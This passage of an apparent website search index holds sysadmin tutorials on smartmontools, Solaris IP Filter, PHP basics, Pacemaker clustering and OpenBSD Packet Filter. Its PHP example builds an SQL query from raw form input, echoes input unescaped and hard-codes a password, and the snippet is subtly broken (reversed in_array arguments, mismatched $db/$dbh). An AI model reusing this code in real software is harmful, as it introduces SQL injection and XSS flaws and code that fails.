Pre-fail Always - 0 12 Power_Cycle_Count 0x0032 253 253 000 Old_age Always - 22 192 Power-Off_Retract_Count 0x0032 253 253 000 Old_age Always - 13 193 Load_Cycle_Count 0x0032 253 253 000 Old_age Always - 72 194 Temperature_Celsius 0x0032 253 253 000 Old_age Always - 31 195 Hardware_ECC_Recovered 0x000a 253 252 000 Old_age Always - 25095 196 Reallocated_Event_Count 0x0008 253 253 000 Old_age Offline - 0 197 Current_Pending_Sector 0x0008 253 253 000 Old_age Offline - 0 198 Offline_Uncorrectable 0x0008 253 253 000 Old_age Offline - 0 199 UDMA_CRC_Error_Count 0x0008 199 199 000 Old_age Offline - 0 200 Multi_Zone_Error_Rate 0x000a 253 252 000 Old_age Always - 0 201 Soft_Read_Error_Rate 0x000a 251 138 000 Old_age Always - 1746 202 TA_Increase_Count 0x000a 253 252 000 Old_age Always - 0 203 Run_Out_Cancel 0x000b 253 252 180 Pre-fail Always - 137 204 Shock_Count_Write_Opern 0x000a 253 252 000 Old_age Always - 0 205 Shock_Rate_Write_Opern 0x000a 253 252 000 Old_age Always - 0 207 Spin_High_Current 0x002a 252 252 000 Old_age Always - 0 208 Spin_Buzz 0x002a 252 252 000 Old_age Always - 0 209 Offline_Seek_Performnce 0x0024 187 183 000 Old_age Offline - 0 99 Unknown_Attribute 0x0004 253 253 000 Old_age Offline - 0 100 Unknown_Attribute 0x0004 253 253 000 Old_age Offline - 0 101 Unknown_Attribute 0x0004 253 253 000 Old_age Offline - 0 SMART Error Log Version: 1 No Errors Logged SMART Self-test log structure revision number 1 No self-tests have been logged. [To run self-tests, use: smartctl -t] SMART Selective self-test log data structure revision number 1 SPAN MIN_LBA MAX_LBA CURRENT_TEST_STATUS 1 0 0 Not_testing 2 0 0 Not_testing 3 0 0 Not_testing 4 0 0 Not_testing 5 0 0 Not_testing Selective self-test flags (0x0): After scanning selected spans, do NOT read-scan remainder of disk. If Selective self-test is pending on power-up, resume after 0 minute delay. Now we need to interpret the information such as disk uptime, temperature, and most importantly for us, errors. For this we mainly observe the last two columns: WHEN_FAILED and RAW_VALUE, and the section just below: SMART Error Log Version: 1 No Errors Logged.\nAn example:\n5 Reallocated_Sector_Ct 0x0033 016 016 063 Pre-fail Always FAILING_NOW 598 Here we see that sector reallocation has failed. You should therefore monitor this part. If the number indicated quickly increases to higher figures, take the necessary measures: back up your data and possibly contact support.\nConclusion linkSmartmontools is simple to use and very comprehensive. Note, however, that such a tool does not replace the most important thing: regular backup of your data.\nFAQ linkProblems during updates linkSometimes during a package update, things may go wrong and you may not know why. The problem is actually quite simple. Just stop the service:\n/etc/init.d/smartmontool stop then restart the update.\nThe service won’t start linkThis problem can occur when SMART is simply not enabled. To enable it, just type this command:\nsmartctl -s on /dev/sda Then try to start smartmontools:\n/etc/init.d/smartmontools start Resources linkChecking Hard Disk Sanity With Smartmontools\nhttp://www.davidandrzejewski.com/2009/03/15/freebsd-monitor-your-disks-health-with-smartmontools/\n"
            }
        );
    index.add(
            {
                id:  409 ,
                href: "\/IP_Filter_:_Utilisation_du_firewall_sous_Solaris\/",
                title: "IP Filter: Using the Firewall on Solaris",
                description: "A guide on how to configure and use IP Filter, a firewall solution for Solaris operating systems.",
                content: "Introduction linkIPFilter (commonly referred to as ipf) is an open source software package that provides firewall services and network address translation (NAT) for many UNIX-like operating systems. The author and software maintainer is Darren Reed. IPFilter supports both IPv4 and IPv6 protocols, and is a stateful firewall.\nIPFilter is delivered with FreeBSD, NetBSD and Solaris 10. It used to be a part of OpenBSD, but it was removed in May 2001 due to problems with the license of IP Filter, after negotiations between Theo de Raadt and Reed broke down. At first glance, the license looks a lot like BSD Licenses, but does not allow redistribution of modified versions. Reed came back with another proposal but it was already too late. The software was removed from OpenBSD.\nIPFilter can be installed as a runtime-loadable kernel module or directly incorporated into the operating system kernel, depending on the specifics of each kernel and user preferences. The software’s documentation recommends the module approach, if possible.\nUsage link To activate Solaris IP Filter: svcadm enable network/ipfilter To enable IPF: ipf -E To disable IPF: ipf -D Reload configuration ipf -f config_file Activate Nat (optional): ipfnat -f config_file Remove active rule set from the kernel: ipf -Fa Remove incoming packet filtering rules: ipf -Fi Remove outgoing packet filtering rules: ipf -Fo Get stats: ipfstat -io or\nipfstat Configuration linkFiles locations linkThe default configurations files are located in /etc/ipf:\nipf.conf: Containing the main configuration ipnat.conf: Containing Nat configuration ippool.conf: Define server pool If files are named like this, they will be loaded at boot time. If you don’t want, rename them in an other name.\nRedirect all incoming connections to a specific IP on a specific port linkThis is an example to forward any incoming connection to the port 4175:\nsvcadm enable svc:/network/ipv4-forwarding:default ipf -E rdr e1000g0 192.168.76.0/24 port 4175 -\u003e 192.168.15.30 port 4175 tcp rdr e1000g1 192.168.76.0/24 port 4175 -\u003e 192.168.15.30 port 4175 tcp map e1000g0 from any to 192.168.15.30 port = 4175 -\u003e 0/32 map e1000g1 from any to 192.168.15.30 port = 4175 -\u003e 0/32 192.168.76.0 is the subnet of the “forwarder”, 192.168.15.30 is the destination ip.\n"
            }
        );
    index.add(
            {
                id:  410 ,
                href: "\/Introduction_au_PHP\/",
                title: "Introduction to PHP",
                description: "A comprehensive introduction to PHP programming language covering basic syntax, variables, functions, forms, databases, and more.",
                content: "Introduction linkPHP (recursive acronym for PHP: Hypertext Preprocessor) is a free scripting language primarily used to produce dynamic web pages via an HTTP server, but it can also function like any interpreted language locally by executing programs on the command line. PHP is an imperative language that has had complete object-oriented model capabilities since version 5. Due to the richness of its library, PHP is sometimes referred to as a platform rather than just a language.\nBasics link In pages containing mainly HTML, it is possible to insert small pieces of PHP to make life easier. Just use tags like: PHP says hello \u003c?php print \"Hello, World!\"; ?\u003e This will produce:\nPHP says hello Hello, World! We can also reverse the example above to put HTML code in a PHP page: \u003c?php print \u003c\u003c\u003c_HTML_ Your Name: _HTML_; ?\u003e The $_SERVER[PHP_SELF] variable is special to PHP. It is used to get the URL of the called link but without the protocol or the hostname. For example:\nhttps://www.deimos.fr/blocnotesinfo/index.php?title=Introduction_au_PHP Only what is in bold is kept.\nTo give you an idea of what’s available, you can create a file with this:\n\u003c?php echo \"\"; echo \"\" .$_SERVER['argv'] .\"argv\"; echo \"\" .$_SERVER['argc'] .\"argc\"; echo \"\" .$_SERVER['GATEWAY_INTERFACE'] .\"GATEWAY_INTERFACE\"; echo \"\" .$_SERVER['SERVER_ADDR'] .\"SERVER_ADDR\"; echo \"\" .$_SERVER['SERVER_NAME'] .\"SERVER_NAME\"; echo \"\" .$_SERVER['SERVER_SOFTWARE'] .\"SERVER_SOFTWARE\"; echo \"\" .$_SERVER['SERVER_PROTOCOL'] .\"SERVER_PROTOCOL\"; echo \"\" .$_SERVER['REQUEST_METHOD'] .\"REQUEST_METHOD\"; echo \"\" .$_SERVER['REQUEST_TIME'] .\"REQUEST_TIME\"; echo \"\" .$_SERVER['QUERY_STRING'] .\"QUERY_STRING\"; echo \"\" .$_SERVER['DOCUMENT_ROOT'] .\"DOCUMENT_ROOT\"; echo \"\" .$_SERVER['HTTP_ACCEPT'] .\"HTTP_ACCEPT\"; echo \"\" .$_SERVER['HTTP_ACCEPT_CHARSET'] .\"HTTP_ACCEPT_CHARSET\"; echo \"\" .$_SERVER['HTTP_ACCEPT_ENCODING'] .\"HTTP_ACCEPT_ENCODING\"; echo \"\" .$_SERVER['HTTP_ACCEPT_LANGUAGE'] .\"HTTP_ACCEPT_LANGUAGE\"; echo \"\" .$_SERVER['HTTP_CONNECTION'] .\"HTTP_CONNECTION\"; echo \"\" .$_SERVER['HTTP_HOST'] .\"HTTP_HOST\"; echo \"\" .$_SERVER['HTTP_REFERER'] .\"HTTP_REFERER\"; echo \"\" .$_SERVER['HTTP_USER_AGENT'] .\"HTTP_USER_AGENT\"; echo \"\" .$_SERVER['HTTPS'] .\"HTTPS\"; echo \"\" .$_SERVER['REMOTE_ADDR'] .\"REMOTE_ADDR\"; echo \"\" .$_SERVER['REMOTE_HOST'] .\"REMOTE_HOST\"; echo \"\" .$_SERVER['REMOTE_PORT'] .\"REMOTE_PORT\"; echo \"\" .$_SERVER['SCRIPT_FILENAME'] .\"SCRIPT_FILENAME\"; echo \"\" .$_SERVER['SERVER_ADMIN'] .\"SERVER_ADMIN\"; echo \"\" .$_SERVER['SERVER_PORT'] .\"SERVER_PORT\"; echo \"\" .$_SERVER['SERVER_SIGNATURE'] .\"SERVER_SIGNATURE\"; echo \"\" .$_SERVER['PATH_TRANSLATED'] .\"PATH_TRANSLATED\"; echo \"\" .$_SERVER['SCRIPT_NAME'] .\"SCRIPT_NAME\"; echo \"\" .$_SERVER['REQUEST_URI'] .\"REQUEST_URI\"; echo \"\" .$_SERVER['PHP_AUTH_DIGEST'] .\"PHP_AUTH_DIGEST\"; echo \"\" .$_SERVER['PHP_AUTH_USER'] .\"PHP_AUTH_USER\"; echo \"\" .$_SERVER['PHP_AUTH_PW'] .\"PHP_AUTH_PW\"; echo \"\" .$_SERVER['AUTH_TYPE'] .\"AUTH_TYPE\"; echo \"\" ?\u003e For HTML forms corresponding to this: Your Name: This will produce in PHP:\n\u003c?php print \"Hello, \"; // Print what was submitted in the form parameter called 'user' print $_POST['user']; print \"!\"; ?\u003e $_POST contains the values of the form parameters as they were submitted. In programming terms, it’s a variable named as such because you can modify the values it contains. In fact, it’s a array variable because it can hold multiple values simultaneously.\nWhen $_SERVER[PHP_SELF] is the form’s action, you can place both the form display code and the form processing code on the same page:\n\u003c?php // Print a greeting if the form was submitted if ($_POST['user']) { print \"Hello, \"; // Print what was submitted in the form parameter called 'user' print $_POST['user']; print \"!\"; } else { // Otherwise, print the form print \u003c\u003c\u003c_HTML_ Your Name: _HTML_; } ?\u003e For comments, you can use:\n//: For a single line to comment /* to */: To comment a paragraph, we will come back to this later. Now here is an example of PHP code that connects to a database server and retrieves a list of dishes with their prices based on the value of the “rpas” parameter, then displays these dishes and their prices in an HTML table:\n\u003c?php require 'DB.php'; // Connect to MySQL running on localhost with username \"menu\" // and password \"good2eaT\", and database \"dinner\" $db = DB::connect('mysql://menu:good2eaT@localhost/dinner'); // Define what the allowable meals are $meals = array('breakfast','lunch','dinner'); // Check if submitted form parameter \"meal\" is one of // \"breakfast\", \"lunch\", or \"dinner\" if (in_array($meals, $_POST['meal'])) { // If so, get all of the dishes for the specified meal $q = $dbh-\u003equery(\"SELECT dish,price FROM meals WHERE meal LIKE '\" . $_POST['meal'] .\"'\"); // If no dishes were found in the database, say so if ($q-\u003enumrows == 0) { print \"No dishes available.\"; } else { // Otherwise, print out each dish and its price as a row // in an HTML table print 'DishPrice'; while ($row = $q-\u003efetchRow( )) { print \"$row[0]$row[1]\"; } print \"\"; } } else { // This message prints if the submitted parameter \"meal\" isn't // \"breakfast\", \"lunch\", or \"dinner\" print \"Unknown meal.\"; } ?\u003e Manipulation of textual and numerical data linkStrings can be delimited by “”. They work like strings surrounded by ‘, but allow more special characters:\nCharacter Meaning \\n Newline (ASCII 10) \\r Carriage return (ASCII 13) \\t Tab (ASCII 9) \\ \\ $ $ \" \" \\0 .. \\777 Octal (base 8) number \\x0 .. \\xFF Hexadecimal (base 16) number A small example to clarify everything. Imagine $user is Pierre:\n‘Hello $user’: Will display: Hello $user “Hello $user”: Will display: Hello Pierre To combine 2 strings, use a “.” which allows concatenation of strings:\nprint 'bread' . 'fruit'; print \"It's a beautiful day \" . 'in the neighborhood.'; print \"The price is: \" . '$3.95'; print 'Inky' . 'Pinky' . 'Blinky' . 'Clyde'; This will display:\nbreadfruit It's a beautiful day in the neighborhood. The price is: $3.95 InkyPinkyBlinkyClyde Text manipulation linkString validation linkThe trim() function removes spaces at the beginning or end of a string. Combined with strlen(), which tells you the length of a string, you can know the length of a value submitted by a form while ignoring leading and trailing spaces.\n// $_POST['zipcode'] holds the value of the submitted form parameter // \"zipcode\" $zipcode = trim($_POST['zipcode']); // Now $zipcode holds that value, with any leading or trailing spaces // removed $zip_length = strlen($zipcode); // Complain if the ZIP code is not 5 characters long if ($zip_length != 5) { print \"Please enter a ZIP code that is 5 characters long.\"; } You can do it shorter by combining functions. Similar to Final Fantasy when you combine mana:\nif (strlen(trim($_POST['zipcode'])) != 5) { print \"Please enter a ZIP code that is 5 characters long.\"; } To compare strings with the equality operator, use (==):\nif ($_POST['email'] == 'president@whitehouse.gov') { print \"Welcome, Mr. President.\"; } To compare strings without taking case into account, use the strcasecmp() function. It returns 0 if the 2 strings provided to strcasecmp() are equal (regardless of case):\nif (strcasecmp($_POST['email'], 'president@whitehouse.gov') == 0) { print \"Welcome back, Mr. President.\"; } Text formatting linkprintf() gives more control than print over the output appearance:\n$price = 5; $tax = 0.075; printf('The dish costs $%.2f', $price * (1 + $tax)); This will display:\nThe dish costs $5.38 The “%.2f” is replaced by the value of $price * (1 + $tax)) and formatted to have 2 digits after the decimal point.\nFormat rules start with %. You can then place optional modifiers that affect the rule’s behavior:\nA fill character: If the string replacing the format rule is too short, this character will fill it. Use a space to fill with spaces or a 0 to fill with zeros. A sign: For numbers, a + will place a + before positive numbers (they are normally displayed without a sign). For strings, a - will make the string right-justified (by default, strings are left-justified). A minimum width: the minimum size that the value replacing the format rule should have. If it’s shorter, the fill character will be used to fill the void. A point and a number of decimal places: For floating point numbers, this controls the number of digits after the decimal point. In the example above, the .2 formats $price * (1 + $tax)); with 2 decimal places. Here’s an example of zero-padding with printf():\n$zip = '6520'; $month = 2; $day = 6; $year = 2007; printf(\"ZIP is %05d and the date is %02d/%02d/%d\", $zip, $month, $day, $year); Will display:\nZIP is 06520 and the date is 02/06/2007 Displaying signs with printf():\n$min = -40; $max = 40; printf(\"The computer can operate between %+d and %+d degrees Celsius.\", $min, $max); Will display:\nThe computer can operate between -40 and +40 degrees Celsius. To discover other rules with printf, visit http://www.php.net\nThe functions strtolower() and strtoupper() produce, respectively, all lowercase or all uppercase versions of a string.\nprint strtolower('Beef, CHICKEN, Pork, duCK'); print strtoupper('Beef, CHICKEN, Pork, duCK'); Will display:\nbeef, chicken, pork, duck BEEF, CHICKEN, PORK, DUCK The function ucwords() capitalizes the first letter of each word in a string:\nprint ucwords(strtolower('JOHN FRANKENHEIMER')); Will display:\nJohn Frankenheimer Truncating a string with substr():\n// Grab the first thirty characters of $_POST['comments'] print substr($_POST['comments'], 0, 30); // Add an ellipsis print '...'; Will display:\nThe Fresh Fish with Rice Noodle was delicious, but I didn't like the Beef Tripe. The three parameters of substr() are respectively, the string concerned, the starting position of the substring to extract and the number of characters to extract. The string starts at position 0, not 1: substr($_POST[‘comments’], 0, 30) therefore means “extract 30 characters from $_POST[‘comments’] starting from the beginning of this string”.\nExtracting the end of a string with substr():\nprint 'Card: XX'; print substr($_POST['card'],-4,4); If the form parameter is worth 4000-1234-5678-9101, this will display:\nCard: XX9101 So this is a very practical example for credit cards.\nFor brevity, you can use substr($_POST[‘card’],-4) instead of substr($_POST[‘card’], -4,4). If you don’t provide the last parameter, substr() will return everything between the starting position (whether positive or negative) and the end of the string.\nUsing str_replace():\nprint str_replace('{class}',$my_class, 'Fried Bean Curd Oil-Soaked Fish'); Will display:\nFried Bean Curd Oil-Soaked Fish Arithmetic operators linkSome basic operations in PHP:\nprint 2 + 2; print 17 - 3.5; print 10 / 3; print 6 * 9; Will display:\n4 13.5 3.3333333333333 54 In addition to the +, -, /, and * signs, PHP has the modulo % which returns the remainder of a division:\nprint 17 % 3; will display:\n2 Variables linkHere are examples of acceptable variables:\n$size $drinkSize $my_drink_size $_drinks $drink4you2 And unacceptable:\nVariable name Flaw Begins with a number $2hot4u Unacceptable character: - $drink-size Unacceptable characters: @ and . $drinkmaster@example.com Unacceptable character:! $drink!lots Unacceptable character: + $drink+dinner Variable names are case sensitive!!!\nOperations on variables linkSome operations on variables:\n\u003c?php $price = 3.95; $tax_rate = 0.08; $tax_amount = $price * $tax_rate; $total_cost = $price + $tax_amount; $username = 'james'; $domain = '@example.com'; $email_address = $username . $domain; print 'The tax is ' . $tax_amount; print \"\\n\"; // this prints a linebreak print 'The total cost is ' .$total_cost; print \"\\n\"; // this prints a linebreak print $email_address; ?\u003e Addition combined with assignment:\n// Add 3 the regular way $price = $price + 3; // Add 3 with the combined operator $price += 3; Incrementation and decrementation:\n// Add one to $birthday $birthday = $birthday + 1; // Add another one to $birthday ++$birthday; // Subtract 1 from $years_left $years_left = $years_left - 1; // Subtract another 1 from $years_left Variables placed in strings linkIn-place document interpolation:\n$page_title = 'Menu'; $meat = 'pork'; $vegetable = 'bean sprout'; print \u003c\u003c"
            }
        );
    index.add(
            {
                id:  411 ,
                href: "\/Installation_et_Configuration_de_Pacemaker\/",
                title: "Installation and Configuration of Pacemaker",
                description: "A guide on how to install and configure Pacemaker with Corosync on Debian 6",
                content: "Introduction linkPacemaker is the logical evolution of Heartbeat, which has merged with other open source software to achieve perfection. Pacemaker is a resource management software. It must be coupled with Corosync which will manage the exchange of information between nodes.\nThe installation and configuration described here is done on Debian 6.\nInstallation linkFor installation, nothing could be simpler on Debian:\naptitude install pacemaker corosync Configuration linkCorosync linkFor Corosync configuration, we need to generate encryption keys for intra-cluster information exchange (between nodes):\n\u003e corosync-keygen Corosync Cluster Engine Authentication key generator. Gathering 1024 bits for key from /dev/random. Press keys on your keyboard to generate entropy. Press keys on your keyboard to generate entropy (bits = 136). Press keys on your keyboard to generate entropy (bits = 200). Press keys on your keyboard to generate entropy (bits = 264). Press keys on your keyboard to generate entropy (bits = 328). Press keys on your keyboard to generate entropy (bits = 392). Press keys on your keyboard to generate entropy (bits = 456). Press keys on your keyboard to generate entropy (bits = 520). Press keys on your keyboard to generate entropy (bits = 584). Press keys on your keyboard to generate entropy (bits = 648). Press keys on your keyboard to generate entropy (bits = 712). Press keys on your keyboard to generate entropy (bits = 776). Press keys on your keyboard to generate entropy (bits = 840). Press keys on your keyboard to generate entropy (bits = 904). Press keys on your keyboard to generate entropy (bits = 968). Writing corosync key to /etc/corosync/authkey. Then send this configuration to the other nodes using scp for example:\nscp -r /etc/corosync root@nodex:/etc/ Then edit the Corosync configuration file on each node, and adapt the network part for each of them:\n(/etc/corosync/corosync.conf)\n# Please read the openais.conf.5 manual page totem { version: 2 # How long before declaring a token lost (ms) token: 3000 # How many token retransmits before forming a new configuration token_retransmits_before_loss_const: 10 # How long to wait for join messages in the membership protocol (ms) join: 60 # How long to wait for consensus to be achieved before starting a new round of membership configuration (ms) consensus: 3600 # Turn off the virtual synchrony filter vsftype: none # Number of messages that may be sent by one processor on receipt of the token max_messages: 20 # Limit generated nodeids to 31-bits (positive signed integers) clear_node_high_bit: yes # Disable encryption secauth: off # How many threads to use for encryption/decryption threads: 0 # Optionally assign a fixed node id (integer) # nodeid: 1234 # This specifies the mode of redundant ring, which may be none, active, or passive. rrp_mode: none interface { # The following values need to be set based on your environment ringnumber: 0 bindnetaddr: 192.168.20.4 mcastaddr: 226.94.1.1 mcastport: 5405 } } amf { mode: disabled } service { # Load the Pacemaker Cluster Resource Manager ver: 0 name: pacemaker } aisexec { user: root group: root } logging { fileline: off to_stderr: yes to_logfile: no to_syslog: yes syslog_facility: daemon debug: off timestamp: on logger_subsys { subsys: AMF debug: off tags: enter Finally, edit the /etc/default/corosync file to tell it to start at machine boot:\n(/etc/default/corosync)\n# start corosync at boot [yes|no] START=yes Now let’s activate our new configuration on all nodes:\n/etc/init.d/corosync restart Now we can check the status of the cluster:\n\u003e crm_mon --one-shot -V crm_mon[427]: 2010/12/20_21:51:54 ERROR: unpack_resources: Resource start-up disabled since no STONITH resources have been defined crm_mon[427]: 2010/12/20_21:51:54 ERROR: unpack_resources: Either configure some or disable STONITH with the stonith-enabled option crm_mon[427]: 2010/12/20_21:51:54 ERROR: unpack_resources: NOTE: Clusters with shared data need STONITH to ensure data integrity ============ Last updated: Mon Dec 20 21:51:54 2010 Stack: openais Current DC: zazu - partition WITHOUT quorum Version: 1.0.9-74392a28b7f31d7ddc86689598bd23114f58978b 2 Nodes configured, 2 expected votes 0 Resources configured. ============ Online: [ zazu shenzi ] Now we will configure a few things:\nNo quorum (because it’s a 2-node cluster) No Stonith (Fencing) For stickiness, this is to avoid auto-failback of resources \u003e crm crm(live)# configure crm(live)configure# property no-quorum-policy=ignore crm(live)configure# property stonith-enabled=false crm(live)configure# property default-resource-stickiness=1000 crm(live)configure# commit crm(live)configure# bye "
            }
        );
    index.add(
            {
                id:  412 ,
                href: "\/Introduction_%C3%A0_Packet_Filter\/",
                title: "Introduction to Packet Filter",
                description: "A comprehensive guide to Packet Filter (PF), the firewall software for OpenBSD and other BSD systems. Learn about installation, configuration, NAT, filtering rules and advanced features.",
                content: "Introduction linkPacket Filter (or PF) is the official software firewall for OpenBSD, originally written by Daniel Hartmeier. It is a free Open Source software.\nIt replaced Darren Reed’s IPFilter since OpenBSD version 3.0, due to licensing issues and also Reed’s systematic refusal to incorporate code modifications from OpenBSD developers.\nIt has been ported to DragonflyBSD 1.2 and NetBSD 3.0; it is provided as standard on FreeBSD (version 5.3 and later).\nA free port of PF has also been created for Windows 2000 and XP operating systems by the Core FORCE community. However, this port is only a personal firewall: it does not implement PF functions that allow NAT or the use of ALTQ.\nInstallation linkFreeBSD linkInsert the following entries in /etc/rc.conf:\npf_enable=\"YES\" # Load PF pf_rules=\"/etc/pf.conf\" # Rules, default path. pf_flags=\"\" # Bonus pflog_enable=\"YES\" # start logging pflog_logfile=\"/var/log/pflog\" # where to find the log pflog_flags=\"\" # Bonus OpenBSD linkVive OpenBSD :-), no need to install anything, it’s included by default in the system. Just configure and enable it. To configure it, edit the /etc/pf.conf file.\nConfiguration linkWe’ll look at several examples to learn how to use it.\nMacros \u0026 Lists linkMacros linkWe can define macros to replace variables that are used frequently (IPs, interfaces…):\nif_ext=\"ne0\" ssh=\"192.168.0.1\" Lists linkLists allow us to group criteria into a variable:\nblock out on $if_ext proto tcp from { 192.168.0.1, 10.8.0.6 } to any port { 22 80 } This line allows us to execute 4 rules at once! For beginners, this line will block:\n192.168.0.1 on port 80 192.168.0.1 on port 22 10.8.0.6 on port 80 10.8.0.6 on port 22 Mix of Macros and Lists linkTo mix everything:\nif_ext=\"ne0\" trusted=\"{ 192.168.0.1, 10.8.0.6 }\" pass in on $if_ext inet proto tcp from { 10.10.0.0/24 $trusted } to port 22 Tables linkTables allow you to store a large number of addresses (50 or 50,000, it’s the same), which are then used directly in filtering/NAT/redirection rules. Searching for an address in a memory table is much faster and less CPU/memory intensive than searching through a set of rules each corresponding to a value in an address list.\nThere are several keywords for tables with different functions:\ncont: used when you want the table to not be modifiable persist: tells PF not to delete a table that isn’t referenced by a rule The advantage of a non-const table compared to lists is that you can add/remove addresses or subnets on-the-fly, useful for temporarily blocking a spammer’s address, a script-kiddie or managing redirection to a set of high-availability servers.\nFinally, as the icing on the cake, you can initialize a table with a file containing a list of addresses:\ntable const { 192.168.0.0/24, 10.8.0.0/8 } table persist file \"/etc/spammers\" block in on $if_ext from { , } to any And now, if we want to add or remove IPs:\npfctl -t spammers -T add 218.70.0.0/16 pfctl -t spammers -T delete 218.70.0.12 To delete everything:\npfctl -t spammers -T flush NAT linkI won’t explain here what NAT does, but how to use it with PF. First, we activate packet forwarding by adding this to /etc/sysctl.conf:\nnet.inet.ip.forwarding=1 This will make the NAT persistent.\nRemember that packets will pass through the packet filter after being modified, unless the pass keyword is used. This also applies to RDR which we’ll see below. Here is a NAT rule:\nnat [pass] on interface [address_family] from src_addr [port src_port] to dst_addr [port dst_port] -\u003e ext_addr If we break it down (in brackets: variable, italic: optional):\nnat: indicates that this is a nat rule pass: the packet is NATed and sent directly without going through the packet filter on interface: the packet arrived on this network interface ($if_ext, ne0…) address_family: inet or niet6, this is a detail that could be important from src_addr: the packet comes from this address. For the address, you can specify many things: an IP address a CIDR a DNS that will be resolved by PF when loading the rules a network interface a Table or a List any of these notations, preceded by a ! to signify negation finally any for any address port src_port: if you want to NAT only a certain port or range of ports…rarely used to dst_addr: the packet is destined for this address. Same possibilities as for src_addr -\u003e ext: replace the source address with this address. The return will be handled automatically. And if this address changes (assigned by DHCP), you can specify the name of the network interface in parentheses (rl0), and the address will be automatically updated in the rule. Now a small example. If you want to share your internet connection with your local network:\nnat on r10 inet from ne3: network to any -\u003e (r10) That’s it, it’s not the same as with Iptables!\nPacket Redirections linkRDR is NAT’s hidden little brother, in that it does exactly the opposite: it takes packets coming from the outside to redirect them to the local network. Here’s an example of syntax:\nrdr pass on interface [address_family] from src_addr [port src_port] to dst_addr [port dst_port] -\u003e int_addr [port int_port] It’s the same syntax as for NAT with a few exceptions like: I redirect what was destined for dst_addr:dst_port to int_addr:int_port and as with NAT, the return will be handled automatically.\nFor example, if I want to access the SSH of one of my machines on the local network from the outside:\nrdr pass on $external proto tcp to port 35422 -\u003e $diane port ssh And now, you can access the machine in my LAN from outside via my external IP address and port 35422.\nYou’ll notice that I used ssh as a name. All names present in /etc/services can be used.\nFiltering Rules linkFiltering rules are evaluated sequentially from the first to the last (from top to bottom in the rules files used). This means that each packet will be evaluated by each rule, and the last rule matching the packet wins the decision (block or pass). On the contrary, if we use the quick keyword, the evaluation stops as soon as a rule matches the packet. The first (implicit) rule is “let everything through” so that if no rule applies to a packet, it is accepted. This is why the first explicit rule is usually a block all.\nHere’s the syntax:\naction [direction] [log] [quick] [on interface] [address_family] [proto protocol] [from src_addr [port src_port]] [to dst_addr [port dst_port]] [flags tcp_flags] [state] action: choose between block or pass. The policy for blocked packets will be drop or return depending on the block-policy option. By default it’s drop. direction: in or out, if you want to filter incoming or outgoing traffic on the interface. If nothing is specified, the rule will be evaluated for both directions. log: if this flag is present, we record the decision made by this rule concerning the packet. To analyze this, pflog will be our friend. quick: I’ve already mentioned this - if this flag is also present and the packet matches the rule, it will no longer be analyzed/manipulated, and the decision made by this rule will be final. proto protocol: a level 4 protocol, generally tcp, udp or icmp, but we can also encounter any level 4 protocol referenced in /etc/protocols. We can even call it by its little number! port dst_port: Here you can specify a complex range of ports with operators \u003c, \u003c=, \u003e=, \u003e, \u003c\u003e and :, see man pf.conf. flags tcp_flags_check/mask: you can specify additional checks on the flags of a TCP packet, for example to handle TCP session openings. We often use flag S/SA which I would translate as “this rule applies to TCP packets which, on the two SYN and ACK flags, only have SYN set”. If both flags are set, the packet will not match the rule. For other flags, RTFM a bit. state: here we generally use two possibilities: keep state: used when we want to create an entry in the connection state table when a packet matches the rule, and apply the same policy to subsequent packets taking part in the connection. All these packets are therefore attached to this entry, and we can also check that the TCP packet sequence is respected. synproxy state is used when we want PF to act as a TCP proxy for establishing a connection. In this case, PF will handle the request in place of the recipient and will only forward the packets to the latter afterwards. No packets are forwarded to the recipient before the client has completed the initial exchange. This technique helps protect the recipient from TCP SYN flood attacks, where a large number of connection openings are requested in order to cause a denial of service. Here’s a small example to clarify all this:\npass in quick on $external inet proto tcp from any to any port { http, https, smtp, imaps } flags S/SA keep state I allow all TCP/IPv4 packets arriving on the external interface destined for http/https/smtp/imaps ports to pass. I check that these are TCP connection openings, I record their state in the table, and I stop the analysis of these packets at this rule (quick).\nblock in log on $external from { 192.168.0.0/16, 172.16.0.0/12 } to any. Here, I block packets arriving on the external interface with a private source address, and I log the information of the blocked packet. This helps prevent certain spoofing attacks where spoofed packets are sent in order to mislead network equipment.\nOf course, there are still plenty of detailed options and particularities (such as anchors, scrubbing, antispoofing…) that I haven’t mentioned. For more information, refer to the pf.conf documentation.\nUsage linkThe binary for using pf is pfctl. Before starting, you need to enable PF at the kernel level. 2 solutions:\npfctl -e or add pf=YES to /etc/rc.conf.local.\nTo disable pf, simply do:\npfctl -d If you want to do a syntactic analysis of the file without loading the filtering rules, use the -n argument:\npfctl -n If you want to optimize PF, add the -O option, which will remove duplicates and reorder rules.\nOn-the-fly Modifications link -T (kill/flush/add/delete/show/test..): used with -t table, allows you to manipulate a table: delete it, empty it, add an address, delete, display it, check if it’s in the table. Example: pfctl -t blocked-hosts -T show This will display the addresses of all machines that have been added to the blocked-hosts table, declared a little earlier in /etc/pf.conf.\n-F (nat/rules/state/Tables/..): resets NAT rules, filtering rules, states of open connections or tables, respectively. Useful if you want to clean up a bit, reset counters or connections, disable NAT, delete all entries from all tables, etc… -k (host/network): Allows you to kill all entries in the state table concerning connections from a machine/network. If you use this option twice, you delete the states of connections from the first address to the second. Example: pfctl -k 192.168.1.0/24 -k 172.16.0.0/16 This will delete all states of connections between these 2 subnets.\n-s modifier: This option allows you to get a lot of information about the status of PF. If you use it with -r, PF will do reverse-dns lookup for the addresses it displays. The most interesting values for modifier are: rules: display the loaded filtering rules in memory nat: NAT rules state: open connections info: global statistics on PF all: will display everything PF has to tell us e.g:\npfctl -sr -v, -vv, -g, -x, -q: for more verbose modes, and even debug mode (-v -\u003e -x). The -q will put it back in quiet mode. Practical Examples linkSimple linkRequirements:\nWe have a machine connected to the internet via a network interface with a fixed IP called bge0 It must be accessible from outside via 3 trusted IPs The Apache server must be accessible to everyone It must respond to pings from the outside We want to be able to access the internet from this machine We will silently block all other packets # Our network interface iface = \"bge0\" # Trusted machines for SSH connections: trusted_hosts = \"{ 131.25.4.12, 88.12.74.5, 207.124.20.9 }\" # We don't worry about the loopback interface used by several internal services on the machine: set skip on lo # We enable packet normalization on input. PF will reassemble fragmented packets and perform additional checks on them: match in all scrub (no-df) # By default, we block all packets: block all # We allow ICMP packets of type \"echo request\" for pings from outside, and echo reply/time exceeded/destination # unreachable for responses to pings that we had initiated towards the outside: pass in inet proto icmp form any to $iface icmp-type { echoreq, echorep, timex, unreach } # We allow connections to the Apache server and record them in the state table: pass in inet proto tcp from any to $iface port www flags S/SA keep state # We only allow SSH connections from trusted machines: pass in inet proto tcp from $trusted_hosts to $iface port ssh flags S/SA keep state # Finally we allow all outgoing traffic: pass out inet proto tcp from $iface to any flags S/SA keep state pass out inet proto { udp, icmp } 